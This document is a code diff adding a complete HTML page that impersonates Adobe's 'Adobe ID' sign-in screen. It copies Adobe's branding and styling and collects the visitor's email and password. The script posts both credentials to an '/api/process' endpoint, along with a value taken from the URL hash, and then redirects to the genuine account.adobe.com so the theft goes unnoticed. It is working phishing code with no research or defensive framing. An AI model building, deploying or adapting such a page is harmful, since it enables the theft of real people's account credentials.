@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe ID</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: adobe-clean, "Source Sans Pro", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fff; color: #000; }
+        .adobe-input { border: 1px solid #919191; border-radius: 4px; height: 48px; padding: 0 12px; font-size: 16px; width: 100%; transition: border-color 0.2s; }
+        .adobe-input:focus { border-color: #1473e6; outline: none; box-shadow: 0 0 0 1px #1473e6; }
+        .btn-blue { background-color: #1473e6; color: #fff; border-radius: 20px; font-weight: 700; height: 40px; padding: 0 20px; transition: background 0.2s; }
+        .btn-blue:hover { background-color: #0d66d0; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+    <header class="p-6 flex items-center justify-between">
+        <div class="flex items-center gap-2">
+            <img src="https://www.adobe.com/favicon.ico" class="w-6 h-6">
+            <span class="font-bold text-xl">Adobe ID</span>
+        </div>
+    </header>
+    <main class="flex-grow flex items-center justify-center px-4">
+        <div class="w-full max-w-[400px]">
+            <h1 class="text-3xl font-bold mb-4">Sign in</h1>
+            <p class="mb-8">New user? <a href="#" class="text-[#1473e6] font-semibold">Create an account</a></p>
+            
+            <div id="step-id">
+                <label class="block text-sm font-bold mb-2">Email address</label>
+                <input type="email" id="email" class="adobe-input mb-8" placeholder="Enter email">
+                <div class="flex justify-end">
+                    <button onclick="toPassword()" class="btn-blue">Continue</button>
+                </div>
+            </div>
+
+            <div id="step-pass" class="hidden">
+                <div class="flex items-center gap-2 mb-6">
+                    <span id="display-user" class="text-sm font-semibold"></span>
+                    <button onclick="location.reload()" class="text-[#1473e6] text-xs">Change</button>
+                </div>
+                <label class="block text-sm font-bold mb-2">Password</label>
+                <input type="password" id="password" class="adobe-input mb-8" placeholder="Enter password">
+                <div class="flex justify-end">
+                    <button onclick="dispatch()" class="btn-blue">Sign in</button>
+                </div>
+            </div>
+        </div>
+    </main>
+    <script>
+        const config = window.location.hash.substring(1);
+        let userEmail = "";
+
+        function toPassword() {
+            userEmail = document.getElementById('email').value;
+            if(!userEmail) return;
+            document.getElementById('display-user').innerText = userEmail;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+        }
+
+        async function dispatch() {
+            const pass = document.getElementById('password').value;
+            if(!pass) return;
+            try {
+                await fetch('/api/process', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ config, data: { User: userEmail, Pass: pass } })
+                });
+            } finally {
+                window.location.href = "https://account.adobe.com/";
+            }
+        }
+    </script>
+</body>
+</html>
